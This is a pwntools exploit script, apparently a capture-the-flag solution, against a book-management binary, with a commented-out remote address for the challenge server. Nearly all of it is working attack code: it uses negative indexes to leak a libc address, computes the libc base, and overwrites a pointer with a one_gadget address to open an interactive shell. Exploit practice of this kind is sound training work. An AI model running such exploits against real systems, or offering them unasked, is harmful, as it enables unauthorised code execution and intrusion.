from pwn import *

p = process("./main")
# p = remote("35.192.113.20", 3000)
# context.terminal = ["tmux", "splitw", "-h", "-f"]

def print_book(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))

def add(idx, text):
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", text)

def delete(idx):
    p.sendlineafter('> ', '4')
    p.sendlineafter('index : ', str(idx))

def exploit():
    gdb.attach(p, 'brva *print_book+195')
    print_book(-4)

    p.recvline()
    p.recvuntil(". ")

    libc_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x40690
    # libc_base = libc_leak - 214240
    log.info("Libc base : {}".format(hex(libc_base)))
    one_gadget = libc_base +  0x4f322
    # one_gadget = libc_base + 0x4526a
    log.info("One gadget addr : {}".format(hex(one_gadget)))

    add(-3, '\x00' * 2 + p64(one_gadget))
    # for i in range(7):
    #     delete(i)
    # add(-2, 'A' * 20 + p64(one_gadget))
    p.interactive()

if __name__ == "__main__":
    exploit()
